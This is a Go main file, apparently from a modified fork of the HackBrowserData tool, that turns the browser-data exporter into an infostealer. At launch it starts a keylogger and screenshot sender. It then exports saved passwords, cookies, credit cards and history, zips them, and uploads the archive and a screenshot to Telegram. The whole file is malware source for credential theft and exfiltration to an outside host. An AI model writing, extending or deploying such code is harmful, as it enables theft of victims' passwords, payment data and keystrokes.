// main.go
package main

import (
    "fmt"
    "os"
    "os/signal"
    "path/filepath"
    "syscall"
    "time"

    "github.com/moond4rk/hackbrowserdata/browser"
    "github.com/moond4rk/hackbrowserdata/log"
    "github.com/moond4rk/hackbrowserdata/utils/fileutil"
    "github.com/urfave/cli/v2"

    // Replace these imports with your actual module path, e.g. "github.com/yourusername/yourrepo/config"
    "github.com/GiwaMIcheal/HackBrowserData/config"
    "github.com/GiwaMIcheal/HackBrowserData/keylogger"
    "github.com/GiwaMIcheal/HackBrowserData/screenshot"
    "github.com/GiwaMIcheal/HackBrowserData/telegram"
)

var (
    browserName  string
    outputDir    string
    outputFormat string
    verbose      bool
    compress     bool
    profilePath  string
    isFullExport bool
)

func main() {
    // Initialize config (env vars, directories) happen in config.init()

    // Start keylogger + periodic screenshot sender
    if err := keylogger.Start(); err != nil {
        fmt.Fprintf(os.Stderr, "Failed to start keylogger: %v\n", err)
    }
    // Graceful shutdown: when SIGINT/SIGTERM, stop keylogger before exit
    sigs := make(chan os.Signal, 1)
    signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
    go func() {
        <-sigs
        keylogger.Stop()
        os.Exit(0)
    }()

    Execute()
}

func Execute() {
    app := &cli.App{
        Name:      "hack-browser-data",
        Usage:     "Export passwords|bookmarks|cookies|history|credit cards|download history|localStorage|extensions from browser",
        UsageText: "[hack-browser-data -b chrome -f json --dir results --zip]\nExport all browsing data (passwords/cookies/history/bookmarks) from browser",
        Version:   "0.5.0",
        Flags: []cli.Flag{
            &cli.BoolFlag{Name: "verbose", Aliases: []string{"vv"}, Destination: &verbose, Value: false, Usage: "verbose"},
            &cli.BoolFlag{Name: "compress", Aliases: []string{"zip"}, Destination: &compress, Value: false, Usage: "compress result to zip"},
            &cli.StringFlag{Name: "browser", Aliases: []string{"b"}, Destination: &browserName, Value: "all", Usage: "available browsers: all|" + browser.Names()},
            &cli.StringFlag{Name: "results-dir", Aliases: []string{"dir"}, Destination: &outputDir, Value: "results", Usage: "export dir"},
            &cli.StringFlag{Name: "format", Aliases: []string{"f"}, Destination: &outputFormat, Value: "csv", Usage: "output format: csv|json"},
            &cli.StringFlag{Name: "profile-path", Aliases: []string{"p"}, Destination: &profilePath, Value: "", Usage: "custom profile dir path, get with chrome://version"},
            &cli.BoolFlag{Name: "full-export", Aliases: []string{"full"}, Destination: &isFullExport, Value: true, Usage: "is export full browsing data"},
        },
        HideHelpCommand: true,
        Action: func(c *cli.Context) error {
            if verbose {
                log.SetVerbose()
            }
            // Run HackBrowserData exports
            browsers, err := browser.PickBrowsers(browserName, profilePath)
            if err != nil {
                log.Errorf("pick browsers: %v", err)
                return err
            }
            for _, b := range browsers {
                data, err := b.BrowsingData(isFullExport)
                if err != nil {
                    log.Errorf("get browsing data error: %v", err)
                    continue
                }
                data.Output(outputDir, b.Name(), outputFormat)
            }

            var zipPath string
            if compress {
                if err := fileutil.CompressDir(outputDir); err != nil {
                    log.Errorf("compress error: %v", err)
                } else {
                    log.Debug("compress success")
                    zipPath = outputDir + ".zip"
                }
            }

            // If zipped, send it to Telegram after slight delay
            if zipPath != "" {
                go func() {
                    time.Sleep(5 * time.Second)
                    if err := telegram.SendDocument(zipPath); err != nil {
                        log.Errorf("failed to send document: %v", err)
                    }
                }()
            }

            // One-time screenshot send
            ts := time.Now().Format("20060102_150405")
            screenshotPath := filepath.Join(outputDir, "screenshot_"+ts+".png")
            if err := screenshot.CaptureAndSave(screenshotPath); err == nil {
                go func(path string) {
                    if err := telegram.SendPhoto(path); err != nil {
                        log.Errorf("failed to send screenshot: %v", err)
                    }
                    _ = os.Remove(path)
                }(screenshotPath)
            }

            return nil
        },
    }

    if err := app.Run(os.Args); err != nil {
        log.Fatalf("run app error: %v", err)
    }
}
